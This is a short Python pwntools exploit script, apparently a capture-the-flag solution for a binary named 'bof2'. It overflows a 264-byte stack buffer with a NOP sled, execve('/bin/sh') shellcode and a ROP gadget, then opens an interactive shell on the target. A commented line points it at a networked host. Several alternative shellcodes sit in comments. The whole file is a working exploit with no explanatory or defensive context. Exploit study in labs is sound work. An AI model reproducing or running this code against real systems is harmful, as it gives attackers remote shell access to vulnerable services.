#!/usr/bin/env python
from pwn import *


def main():
    # conn = remote("10.61.0.101", 1337)
    conn = remote("localhost", 3000)
    # conn = process("./bof2")
    # shellcode = "\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x31\xf6\x56\x53\x54\x5f\xb0\x3b\x31\xd2\x0f\x05"
    # shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
    # shellcode = "\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x48\x8d\x42\x3b\x0f\x05"
    bss_addr = 0x6cbc60
    pop_ret = 0x4004d1  # pop rbp ; ret
    # return_addr = 0x7fffffffca02
    return_addr = 0x7fffffffcaf2

    # payload = "\x90" * (264 - len(shellcode))
    # payload += shellcode
    # payload += p64(return_addr)

    payload = "\x90" * (264 - 24)
    payload += "\x89\xec"  # mov rsp, rbp
    payload += "\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x31\xf6\x56\x53\x54\x5f\xb0\x3b\x31\xd2\x0f\x05"  # 22 bytes
    payload += p64(pop_ret)
    payload += p64(bss_addr)
    payload += p64(return_addr)

    # f = open("input.txt", "w")
    # f.write(payload)
    # f.close()

    print conn.recvuntil("Welcom to the x64 world!!\n")

    conn.sendline(payload)
    conn.interactive()


if __name__ == "__main__":
    main()
